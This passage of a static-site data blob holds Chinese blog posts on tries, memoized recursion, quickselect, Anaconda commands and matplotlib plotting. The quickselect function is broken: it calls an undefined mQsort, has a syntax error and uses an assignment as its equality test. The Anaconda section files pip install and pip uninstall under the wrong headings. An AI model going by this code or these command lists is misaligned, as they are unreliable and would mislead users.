假设我要查询的单词是abcd，那么在他前面的单词中，以b，c，d，f之类开头的我显然不必考虑。而只要找以a开头的中是否存在abcd就可以了。同样的，在以a开头中的单词中，我们只要考虑以b作为第二个字母的，一次次缩小范围和提高针对性，这样一个树的模型就渐渐清晰了。\n\n假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：",normalizedContent:"trie树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树 hash树 的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。\n\ntrie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。\n\n它有3个基本性质：\n\n * 根节点不包含字符，除根节点外每一个节点都只包含一个字符。\n * 从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。\n * 每个节点的所有子节点包含的字符都不相同。\n\n\n# 作用\n\n 1. 能够保存一些字符串->值的对应关系。基本上，它跟 java 的 hashmap 功能相同，都是 key-value 映射，只不过 trie 的 key 只能是字符串。\n 2. 前缀查询\n 3. 查询\n\n\n# 优点\n\ntrie 的强大之处就在于它的时间复杂度。它的插入和查询时间复杂度都为 o(k) ，其中 k 为 key 的长度，与 trie 中保存了多少个元素无关。hash 表号称是 o(1) 的，但在计算 hash 的时候就确定会是 o(k) ，并且还有碰撞之类的问题；trie 的缺点是空间消耗很高。\n\n\n# 例子\n\n题目：给你100000个长度不超过10的单词。对于每一个单词，我们要判断他出没出现过，如果出现了，求第一次出现在第几个位置。\n\n分析：这题当然可以用hash来解决，但是本文重点介绍的是trie树，因为在某些方面它的用途更大。比如说对于某一个单词，我们要询问它的前缀是否出现过。这样hash就不好搞了，而用trie还是很简单。\n\n如果我们用最傻的方法，对于每一个单词，我们都要去查找它前面的单词中是否有它。那么这个算法的复杂度就是o(n^2)。显然对于100000的范围难以接受。 假设我要查询的单词是abcd，那么在他前面的单词中，以b，c，d，f之类开头的我显然不必考虑。而只要找以a开头的中是否存在abcd就可以了。同样的，在以a开头中的单词中，我们只要考虑以b作为第二个字母的，一次次缩小范围和提高针对性，这样一个树的模型就渐渐清晰了。\n\n假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"记忆化搜索",frontmatter:{title:"记忆化搜索",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/9a57e6/",categories:["数据结构与算法","搜索"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/05.%E6%90%9C%E7%B4%A2/01.%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2.html",relativePath:"01.数据结构与算法/05.搜索/01.记忆化搜索.md",key:"v-698f8d2e",path:"/pages/9a57e6/",headersStr:null,content:"# 一、记忆化递归的解释与分析\n\n前面说道它结合了dp和递归的优点，分别是记忆化和逻辑清晰易懂。\n\n下面还是结合斐波那契数列的来理解：\n\nF(0)=F(1)=1;\n\nF(n)=F(n-1)+F(n-2) (n≥2,n∈N*);\n\n这里直接给出函数代码，再进行解释：\n\nint F(int n){\n    if(n<2)f[n]=1;          //这里f[]是储存数据的数组\n    else if(f[n]==0)        //这里是重点\n        f[n]=F(n-1)+F(n-2);\n    return f[n];\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n代码解释：\n\n第3行中else if的条件很关键：当f[n]没被计算过，就计算一次。也就是说，如果f[n]已经被计算过储存起来了，那就直接用储存的数据，便不用再计算了。\n\n分析优势：\n\n相对于递归，逻辑清晰易懂，就不用说了。\n\n主要是相对于dp的优势。从上一篇知道dp是将基础全部算出来，然后在这个基础上计算出我们要的那个值，减少了相对普通递归的重复计算。\n\n记忆化递归则更加”投机取巧“了，它只计算了需要用的值并储存起来，而其它不会用到的值不去计算，最大化地减少了计算。打个比方，dp就相当于计算了一个方阵上所有的点（无论有没有利用价值），而记忆化递归相当于计算了方阵上有价值的点，因此记忆化递归的运行时间可能比dp还要短。（注意只是可能，因为斐波那契数列无论是dp还是记忆化递归，都是要把前面的值全部算出来的）",normalizedContent:"# 一、记忆化递归的解释与分析\n\n前面说道它结合了dp和递归的优点，分别是记忆化和逻辑清晰易懂。\n\n下面还是结合斐波那契数列的来理解：\n\nf(0)=f(1)=1;\n\nf(n)=f(n-1)+f(n-2) (n≥2,n∈n*);\n\n这里直接给出函数代码，再进行解释：\n\nint f(int n){\n    if(n<2)f[n]=1;          //这里f[]是储存数据的数组\n    else if(f[n]==0)        //这里是重点\n        f[n]=f(n-1)+f(n-2);\n    return f[n];\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n代码解释：\n\n第3行中else if的条件很关键：当f[n]没被计算过，就计算一次。也就是说，如果f[n]已经被计算过储存起来了，那就直接用储存的数据，便不用再计算了。\n\n分析优势：\n\n相对于递归，逻辑清晰易懂，就不用说了。\n\n主要是相对于dp的优势。从上一篇知道dp是将基础全部算出来，然后在这个基础上计算出我们要的那个值，减少了相对普通递归的重复计算。\n\n记忆化递归则更加”投机取巧“了，它只计算了需要用的值并储存起来，而其它不会用到的值不去计算，最大化地减少了计算。打个比方，dp就相当于计算了一个方阵上所有的点（无论有没有利用价值），而记忆化递归相当于计算了方阵上有价值的点，因此记忆化递归的运行时间可能比dp还要短。（注意只是可能，因为斐波那契数列无论是dp还是记忆化递归，都是要把前面的值全部算出来的）",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"快速选择(Quickselect)算法：寻找第k大的元素",frontmatter:{title:"快速选择(Quickselect)算法：寻找第k大的元素",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/9a78a3/",categories:["数据结构与算法","搜索"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/05.%E6%90%9C%E7%B4%A2/02.%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9(Quickselect)%E7%AE%97%E6%B3%95%EF%BC%9A%E5%AF%BB%E6%89%BE%E7%AC%ACk%E5%A4%A7%E7%9A%84%E5%85%83%E7%B4%A0.html",relativePath:"01.数据结构与算法/05.搜索/02.快速选择(Quickselect)算法：寻找第k大的元素.md",key:"v-125e4674",path:"/pages/9a78a3/",headersStr:null,content:"> https://magiclen.org/quickselect\n\n\n# 简介\n\n在我们求一组元素的第K大值或者前K大值时，可能最先想到的是对元素进行排序，然后选择第K大的或者前K大的值。不过我们只是想取第K大的数，有必须将整组元素进行排序吗？当然不必，这就是我们将要介绍的快速选择算法，其时间复杂度可以达到O(n)。它在一定程度上是基于快速排序的思想。下面我们假设需要寻找一堆元素的中位数。\n\n\n# 快速排序\n\n快速排序算法 快速排序算基本可以算是比较排序法中效果最优的，它的时间复杂度O(nlogn)。 快速排序步骤： (1)首先设定一个分界值，通过该分界值将数组分成左右两部分。 (2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。 (3)重复（1）（2）步骤直至数据不能再划分为止。\n\n第一次排序： 以第一个数为分界值，从左往右找一个比分界值大的数，从右往左找一个比分界值小的数，如果比分界值大的在小的左边，则交换两个数位置。再记录下比分界值小的数的个数，最后将分界值放入对应位置，完成第一次排序。接着对分界值左边和右边的数分别进行递归操作直到完成排序。 递归排序：\n\n代码如下：\n\ntemplate<typename T>\nstatic void Qsort(T arr[], int low, int high) {\n //c++;\n if (high <= low) return;\n int i = low;\n int j = high + 1;\n int key = arr[low];\n while (true)\n {\n  /*从左向右找比key大的值*/\n  while (arr[++i] < key)\n  {\n   if (i == high) {\n    break;\n   }\n  }\n  /*从右向左找比key小的值*/\n  while (arr[--j] > key)\n  {\n   if (j == low) {\n    break;\n   }\n  }\n  if (i >= j) break;\n  /*交换i,j对应的值*/\n  int temp = arr[i];\n  arr[i] = arr[j];\n  arr[j] = temp;\n }\n /*中枢值与j对应值交换*/\n int temp = arr[low];\n arr[low] = arr[j];\n arr[j] = temp;\n Qsort(arr, low, j - 1);\n Qsort(arr, j + 1, high);\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 选择算法\n\n在前面快速排序中，我们确定了6的位置之后，由于我们需要寻找中位数，完全不需要对6右边的数据进行排序，因此有了选择算法。与快速排序一样，我们将输入数组进行递归划分，与快速排序不同的是，快速排序会递归处理划分的两边，而选择只处理划分一边。 橙色为我们需要确定的中间位置的数（即中位数），黄色为当前作分界值的数，也是一轮比较交换之后能确定位置的数。当我们每次确定位置的数确定的位置在中间位置，那么这个分界值数就是中位数。 代码如下：\n\ntemplate<typename T>\nT Select(T arr[], int low, int high, int m) {\n //c++;\n if (high <= low)\n {\n  return -1;\n }\n int i = low;\n int j = high + 1;\n int key = arr[low];\n while (true)\n {\n  /*从左向右找比key大的值*/\n  while (arr[++i] < key)\n  {\n   if (i == high) {\n    break;\n   }\n  }\n  /*从右向左找比key小的值*/\n  while (arr[--j] > key)\n  {\n   if (j == low) {\n    break;\n   }\n  }\n  if (i >= j) break;\n  /*交换i,j对应的值*/\n  int temp = arr[i];\n  arr[i] = arr[j];\n  arr[j] = temp;\n }\n /*中枢值与j对应值交换*/\n int temp = arr[low];\n arr[low] = arr[j];\n arr[j] = temp;\n if (j > m) {\n  mQsort(arr, low, j - 1, m);\n }\n if (j < m) {\n  mQsort(arr, j + 1, high, m）);\n }\n if (j = m) {\n  return arr[j];\n }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n在选出第K大的元素之后，我们也自然有了前K大的数，因为在K右边的数都是比K大的，在K左边的数都是比K小的。",normalizedContent:"> https://magiclen.org/quickselect\n\n\n# 简介\n\n在我们求一组元素的第k大值或者前k大值时，可能最先想到的是对元素进行排序，然后选择第k大的或者前k大的值。不过我们只是想取第k大的数，有必须将整组元素进行排序吗？当然不必，这就是我们将要介绍的快速选择算法，其时间复杂度可以达到o(n)。它在一定程度上是基于快速排序的思想。下面我们假设需要寻找一堆元素的中位数。\n\n\n# 快速排序\n\n快速排序算法 快速排序算基本可以算是比较排序法中效果最优的，它的时间复杂度o(nlogn)。 快速排序步骤： (1)首先设定一个分界值，通过该分界值将数组分成左右两部分。 (2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。 (3)重复（1）（2）步骤直至数据不能再划分为止。\n\n第一次排序： 以第一个数为分界值，从左往右找一个比分界值大的数，从右往左找一个比分界值小的数，如果比分界值大的在小的左边，则交换两个数位置。再记录下比分界值小的数的个数，最后将分界值放入对应位置，完成第一次排序。接着对分界值左边和右边的数分别进行递归操作直到完成排序。 递归排序：\n\n代码如下：\n\ntemplate<typename t>\nstatic void qsort(t arr[], int low, int high) {\n //c++;\n if (high <= low) return;\n int i = low;\n int j = high + 1;\n int key = arr[low];\n while (true)\n {\n  /*从左向右找比key大的值*/\n  while (arr[++i] < key)\n  {\n   if (i == high) {\n    break;\n   }\n  }\n  /*从右向左找比key小的值*/\n  while (arr[--j] > key)\n  {\n   if (j == low) {\n    break;\n   }\n  }\n  if (i >= j) break;\n  /*交换i,j对应的值*/\n  int temp = arr[i];\n  arr[i] = arr[j];\n  arr[j] = temp;\n }\n /*中枢值与j对应值交换*/\n int temp = arr[low];\n arr[low] = arr[j];\n arr[j] = temp;\n qsort(arr, low, j - 1);\n qsort(arr, j + 1, high);\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 选择算法\n\n在前面快速排序中，我们确定了6的位置之后，由于我们需要寻找中位数，完全不需要对6右边的数据进行排序，因此有了选择算法。与快速排序一样，我们将输入数组进行递归划分，与快速排序不同的是，快速排序会递归处理划分的两边，而选择只处理划分一边。 橙色为我们需要确定的中间位置的数（即中位数），黄色为当前作分界值的数，也是一轮比较交换之后能确定位置的数。当我们每次确定位置的数确定的位置在中间位置，那么这个分界值数就是中位数。 代码如下：\n\ntemplate<typename t>\nt select(t arr[], int low, int high, int m) {\n //c++;\n if (high <= low)\n {\n  return -1;\n }\n int i = low;\n int j = high + 1;\n int key = arr[low];\n while (true)\n {\n  /*从左向右找比key大的值*/\n  while (arr[++i] < key)\n  {\n   if (i == high) {\n    break;\n   }\n  }\n  /*从右向左找比key小的值*/\n  while (arr[--j] > key)\n  {\n   if (j == low) {\n    break;\n   }\n  }\n  if (i >= j) break;\n  /*交换i,j对应的值*/\n  int temp = arr[i];\n  arr[i] = arr[j];\n  arr[j] = temp;\n }\n /*中枢值与j对应值交换*/\n int temp = arr[low];\n arr[low] = arr[j];\n arr[j] = temp;\n if (j > m) {\n  mqsort(arr, low, j - 1, m);\n }\n if (j < m) {\n  mqsort(arr, j + 1, high, m）);\n }\n if (j = m) {\n  return arr[j];\n }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n在选出第k大的元素之后，我们也自然有了前k大的数，因为在k右边的数都是比k大的，在k左边的数都是比k小的。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"目录",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"01.数据结构与算法",imgUrl:"/img/catalog.png",description:"数据结构与算法"}},title:"目录",date:"2022-04-17T21:48:12.000Z",permalink:"/ds/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/catalog.html",relativePath:"01.数据结构与算法/catalog.md",key:"v-0c3a5b4c",path:"/ds/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"anaconda常用指令",frontmatter:{title:"anaconda常用指令",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/623446/",categories:["Python"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/02.Python/01.anaconda%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4.html",relativePath:"02.Python/01.anaconda常用指令.md",key:"v-50db1517",path:"/pages/623446/",headers:[{level:2,title:"包管理",slug:"包管理",normalizedTitle:"包管理",charIndex:2},{level:3,title:"安装包",slug:"安装包",normalizedTitle:"安装包",charIndex:10},{level:3,title:"卸载包",slug:"卸载包",normalizedTitle:"卸载包",charIndex:162},{level:3,title:"更新包",slug:"更新包",normalizedTitle:"更新包",charIndex:212},{level:3,title:"搜索包",slug:"搜索包",normalizedTitle:"搜索包",charIndex:264},{level:3,title:"查看所有包",slug:"查看所有包",normalizedTitle:"查看所有包",charIndex:292},{level:3,title:"升级包版本",slug:"升级包版本",normalizedTitle:"升级包版本",charIndex:314},{level:2,title:"环境管理",slug:"环境管理",normalizedTitle:"环境管理",charIndex:344},{level:3,title:"创建环境",slug:"创建环境",normalizedTitle:"创建环境",charIndex:353},{level:3,title:"切换环境",slug:"切换环境",normalizedTitle:"切换环境",charIndex:580},{level:3,title:"退出当前环境",slug:"退出当前环境",normalizedTitle:"退出当前环境",charIndex:644},{level:3,title:"显示所有环境",slug:"显示所有环境",normalizedTitle:"显示所有环境",charIndex:714},{level:3,title:"删除环境",slug:"删除环境",normalizedTitle:"删除环境",charIndex:741},{level:3,title:"导出环境",slug:"导出环境",normalizedTitle:"导出环境",charIndex:883},{level:3,title:"配置环境",slug:"配置环境",normalizedTitle:"配置环境",charIndex:955}],headersStr:"包管理 安装包 卸载包 更新包 搜索包 查看所有包 升级包版本 环境管理 创建环境 切换环境 退出当前环境 显示所有环境 删除环境 导出环境 配置环境",content:"# 包管理\n\n\n# 安装包\n\nconda install <包名称列表> 指定安装的包：conda install numpy 同时安装多个包：conda install numpy scipy 指定安装的版本：conda install numpy=1.10 、conda install numpy==1.10\n\n\n# 卸载包\n\nconda remove <包名称列表> pip install <包名称列表>\n\n\n# 更新包\n\nconda update <包名称列表> pip uninstall <表名称列表>\n\n\n# 搜索包\n\nconda search <搜索项>\n\n\n# 查看所有包\n\nconda list\n\n\n# 升级包版本\n\nconda update <包名称>\n\n\n# 环境管理\n\n\n# 创建环境\n\nconda create env --name <环境名称> <包名称列表> conda create --name <环境名称> <包名称列表> conda create env -n <环境名称> <包名称列表> conda create -n <环境名称> <工具包列表> eg: conda create -n py2 python=2.7 pandas conda create --name py3 python=3.7\n\n\n# 切换环境\n\nWindows系统 activate <环境名称> 其他系统 source activate <环境名称>\n\n\n# 退出当前环境\n\nWindows系统 deactivate <环境名称> 其他系统 source deactivate <环境名称>\n\n\n# 显示所有环境\n\nconda env list\n\n\n# 删除环境\n\nconda env remove --name <环境名称> --all conda remove --name <环境名称> --all conda env remove -n <环境名称> --all conda remove -n <环境名称> --all\n\n\n# 导出环境\n\n当分享代码的时候，同时也需要将代码的运行环境进行分享 conda env export > environment.yml\n\n\n# 配置环境\n\n当执行他人的代码时，也需要配置相应的环境。这时可以使用对方分享的YAML文件来创建同样的运行环境 conda env creat -f environment.yml",normalizedContent:"# 包管理\n\n\n# 安装包\n\nconda install <包名称列表> 指定安装的包：conda install numpy 同时安装多个包：conda install numpy scipy 指定安装的版本：conda install numpy=1.10 、conda install numpy==1.10\n\n\n# 卸载包\n\nconda remove <包名称列表> pip install <包名称列表>\n\n\n# 更新包\n\nconda update <包名称列表> pip uninstall <表名称列表>\n\n\n# 搜索包\n\nconda search <搜索项>\n\n\n# 查看所有包\n\nconda list\n\n\n# 升级包版本\n\nconda update <包名称>\n\n\n# 环境管理\n\n\n# 创建环境\n\nconda create env --name <环境名称> <包名称列表> conda create --name <环境名称> <包名称列表> conda create env -n <环境名称> <包名称列表> conda create -n <环境名称> <工具包列表> eg: conda create -n py2 python=2.7 pandas conda create --name py3 python=3.7\n\n\n# 切换环境\n\nwindows系统 activate <环境名称> 其他系统 source activate <环境名称>\n\n\n# 退出当前环境\n\nwindows系统 deactivate <环境名称> 其他系统 source deactivate <环境名称>\n\n\n# 显示所有环境\n\nconda env list\n\n\n# 删除环境\n\nconda env remove --name <环境名称> --all conda remove --name <环境名称> --all conda env remove -n <环境名称> --all conda remove -n <环境名称> --all\n\n\n# 导出环境\n\n当分享代码的时候，同时也需要将代码的运行环境进行分享 conda env export > environment.yml\n\n\n# 配置环境\n\n当执行他人的代码时，也需要配置相应的环境。这时可以使用对方分享的yaml文件来创建同样的运行环境 conda env creat -f environment.yml",charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"matplotlib一个界面绘制多个图",frontmatter:{title:"matplotlib一个界面绘制多个图",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/0f29b1/",categories:["Python"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/02.Python/03.matplotlib%E4%B8%80%E4%B8%AA%E7%95%8C%E9%9D%A2%E7%BB%98%E5%88%B6%E5%A4%9A%E4%B8%AA%E5%9B%BE.html",relativePath:"02.Python/03.matplotlib一个界面绘制多个图.md",key:"v-5366b9aa",path:"/pages/0f29b1/",headers:[{level:2,title:"Figure 对象：创建画布",slug:"figure-对象-创建画布",normalizedTitle:"figure 对象：创建画布",charIndex:2},{level:2,title:"划分子图",slug:"划分子图",normalizedTitle:"划分子图",charIndex:276},{level:2,title:"设置标题",slug:"设置标题",normalizedTitle:"设置标题",charIndex:578},{level:3,title:"全局标题",slug:"全局标题",normalizedTitle:"全局标题",charIndex:587},{level:3,title:"子图标题",slug:"子图标题",normalizedTitle:"子图标题",charIndex:613},{level:2,title:"tight_layout()函数",slug:"tight-layout-函数",normalizedTitle:"tight_layout()函数",charIndex:1107}],headersStr:"Figure 对象：创建画布 划分子图 设置标题 全局标题 子图标题 tight_layout()函数",content:'# Figure 对象：创建画布\n\n * num：图形编号或名称，取值为数字/字符串。\n * figsize：绘图对象的宽和高，单位为英寸。\n * dpi：绘图对象的分辨率，缺省值为80。\n * facecolor：背景颜色。\n * edgecolor：边框颜色。\n * frameon：表示是否显示边框。\n\nimport matplotlib.pyplot as plt \n\nplt.figure(figsize=(3,2),facecolor="green")\nplt.plot()\nplt.show()\n\n\n1\n2\n3\n4\n5\n\n\n> \n\n\n# 划分子图\n\nsubplot( 行数, 列数, 子图序号 ) 以中间的那个2x2的划分方式为例\n\nplt.subplot(2,2,1)\nplt.subplot(2,2,2)\nplt.subplot(2,2,3)\nplt.subplot(2,2,4)\nplt.show()\n\n\n1\n2\n3\n4\n5\n\n\n> \n\n每执行一次subplot相当于绘制了一个子图，如果只执行三个subplot\n\nplt.subplot(2,2,1)\nplt.subplot(2,2,2)\n# plt.subplot(2,2,3)\nplt.subplot(2,2,4)\nplt.show()\n\n\n1\n2\n3\n4\n5\n\n\n> \n\n\n# 设置标题\n\n\n# 全局标题\n\nsuptitle (标题文字)\n\n\n# 子图标题\n\ntitle (标题文字) 主要参数;\n\nplt.subplot(2,2,1)\nplt.title(\'subtitle1\')\n\nplt.subplot(2,2,2)\nplt.title(\'subtitle2\',loc=\'left\',color=\'blue\')\n\nplt.subplot(2,2,3)\nmyfont_dict = {\n    \'fontsize\':20,\n    "color":"green",\n    "rotation":45\n    }\nplt.title(\'subtitle3\',fontdict=myfont_dict)\n\nplt.subplot(2,2,4)\nplt.title(\'subtitle4\',color="#ffffff",backgroundcolor="#000000")\n\nplt.suptitle("title",fontsize= 30,color = "red")\n\nplt.show()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n> 为了防止互相遮挡，使用tight_layout()函数\n\n\n# tight_layout()函数\n\n检查坐标轴标签、刻度标签、和子图标题，自动调整子图，使之填充整个绘图区域，并消除子图之间的重叠\n\ntight_layout( rect=[left, bottom, right, top])\n\n\n1\n\n\n传入的四个数字，分别是矩形左下角和右上角的点的坐标，如果不传入默认是[0,0,1,1]\n\nplt.tight_layout(rect = [0,0,1,0.9])\n\n\n1\n\n\n> \n\n再随便举个例子\n\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n\ndef main():\n    # scatter#  #\n    #plt.figure()  # set up a figure #\n    for i in range(1,5):\n        plt.subplot(2,2,i)  # a figure with 3 rows and 3 columns #\n        n = 128\n        X = np.random.normal(0, 1, n)\n        Y = np.random.normal(0, 1, n)\n        T = np.arctan2(Y, X)\n        # plt.axes([0.025, 0.025, 0.95, 0.95])#\n        plt.scatter(X, Y, s=75, c=T, alpha=5)\n        plt.xlim(-1.5, 1.5), plt.xticks([])  # the range about x #\n        plt.ylim(-1.5, 1.5), plt.yticks([])\n        plt.axis()\n        plt.title("scatter")\n        plt.xlabel("X")\n        plt.ylabel("Y")\n    plt.show()\nif __name__ == "__main__":\n    main()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n> \n\n如果遇到了中文不能显示的问题 matplotlib解决中文显示问题',normalizedContent:'# figure 对象：创建画布\n\n * num：图形编号或名称，取值为数字/字符串。\n * figsize：绘图对象的宽和高，单位为英寸。\n * dpi：绘图对象的分辨率，缺省值为80。\n * facecolor：背景颜色。\n * edgecolor：边框颜色。\n * frameon：表示是否显示边框。\n\nimport matplotlib.pyplot as plt \n\nplt.figure(figsize=(3,2),facecolor="green")\nplt.plot()\nplt.show()\n\n\n1\n2\n3\n4\n5\n\n\n> \n\n\n# 划分子图\n\nsubplot( 行数, 列数, 子图序号 ) 以中间的那个2x2的划分方式为例\n\nplt.subplot(2,2,1)\nplt.subplot(2,2,2)\nplt.subplot(2,2,3)\nplt.subplot(2,2,4)\nplt.show()\n\n\n1\n2\n3\n4\n5\n\n\n> \n\n每执行一次subplot相当于绘制了一个子图，如果只执行三个subplot\n\nplt.subplot(2,2,1)\nplt.subplot(2,2,2)\n# plt.subplot(2,2,3)\nplt.subplot(2,2,4)\nplt.show()\n\n\n1\n2\n3\n4\n5\n\n\n> \n\n\n# 设置标题\n\n\n# 全局标题\n\nsuptitle (标题文字)\n\n\n# 子图标题\n\ntitle (标题文字) 主要参数;\n\nplt.subplot(2,2,1)\nplt.title(\'subtitle1\')\n\nplt.subplot(2,2,2)\nplt.title(\'subtitle2\',loc=\'left\',color=\'blue\')\n\nplt.subplot(2,2,3)\nmyfont_dict = {\n    \'fontsize\':20,\n    "color":"green",\n    "rotation":45\n    }\nplt.title(\'subtitle3\',fontdict=myfont_dict)\n\nplt.subplot(2,2,4)\nplt.title(\'subtitle4\',color="#ffffff",backgroundcolor="#000000")\n\nplt.suptitle("title",fontsize= 30,color = "red")\n\nplt.show()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n> 为了防止互相遮挡，使用tight_layout()函数\n\n\n# tight_layout()函数\n\n检查坐标轴标签、刻度标签、和子图标题，自动调整子图，使之填充整个绘图区域，并消除子图之间的重叠\n\ntight_layout( rect=[left, bottom, right, top])\n\n\n1\n\n\n传入的四个数字，分别是矩形左下角和右上角的点的坐标，如果不传入默认是[0,0,1,1]\n\nplt.tight_layout(rect = [0,0,1,0.9])\n\n\n1\n\n\n> \n\n再随便举个例子\n\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n\ndef main():\n    # scatter#  #\n    #plt.figure()  # set up a figure #\n    for i in range(1,5):\n        plt.subplot(2,2,i)  # a figure with 3 rows and 3 columns #\n        n = 128\n        x = np.random.normal(0, 1, n)\n        y = np.random.normal(0, 1, n)\n        t = np.arctan2(y, x)\n        # plt.axes([0.025, 0.025, 0.95, 0.95])#\n        plt.scatter(x, y, s=75, c=t, alpha=5)\n        plt.xlim(-1.5, 1.5), plt.xticks([])  # the range about x #\n        plt.ylim(-1.5, 1.5), plt.yticks([])\n        plt.axis()\n        plt.title("scatter")\n        plt.xlabel("x")\n        plt.ylabel("y")\n    plt.show()\nif __name__ == "__main__":\n    main()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n> \n\n如果遇到了中文不能显示的问题 matplotlib解决中文显示问题',charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"matplotlib解决中文显示问题_",frontmatter:{title:"matplotlib解决中文显示问题_",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/857fce/",categories:["Python"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/02.Python/02.matplotlib%E8%A7%A3%E5%86%B3%E4%B8%AD%E6%96%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98_.html",relativePath:"02.Python/02.matplotlib解决中文显示问题_.md",key:"v-3261059e",path:"/pages/857fce/",headersStr:null,content:"# 指定默认字体\nplt.rcParams['font.sans-serif'] = ['Microsoft YaHei']\n# 解决保存图像是负号'-'显示为方块的问题\nplt.rcParams['axes.unicode_minus'] = False\n\n\n1\n2\n3\n4\n",normalizedContent:"# 指定默认字体\nplt.rcparams['font.sans-serif'] = ['microsoft yahei']\n# 解决保存图像是负号'-'显示为方块的问题\nplt.rcparams['axes.unicode_minus'] = false\n\n\n1\n2\n3\n4\n",charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"Python韦恩图绘制",frontmatter:{title:"Python韦恩图绘制",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/e08ab4/",categories:["Python"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/02.Python/04.Python%E9%9F%A6%E6%81%A9%E5%9B%BE%E7%BB%98%E5%88%B6.html",relativePath:"02.Python/04.Python韦恩图绘制.md",key:"v-e8816230",path:"/pages/e08ab4/",headers:[{level:2,title:"正文",slug:"正文",normalizedTitle:"正文",charIndex:48},{level:3,title:"下载",slug:"下载",normalizedTitle:"下载",charIndex:70},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:52}],headersStr:"正文 下载 使用",content:"> 摘自：https://www.jianshu.com/p/25b0dc441247\n\n\n# 正文\n\n使用python绘制韦恩图\n\n\n# 下载\n\neasy_install matplotlib-venn \n\n\n1\n\n\n韦恩图依赖于以下的包：\n\n * numpy\n * scipy\n * matplotlib\n\n\n# 使用\n\nmatplotlib-venn 包提供了四个主要的函数：venn2、venn2-circles、venn3 和 venn3-circles。\n\nvenn2和venn2_circles接受一个3元素（Ab，aB，AB）构成的 tuple 作为各个子集所包含元素的个数（不是具体的元素）：\n\n> 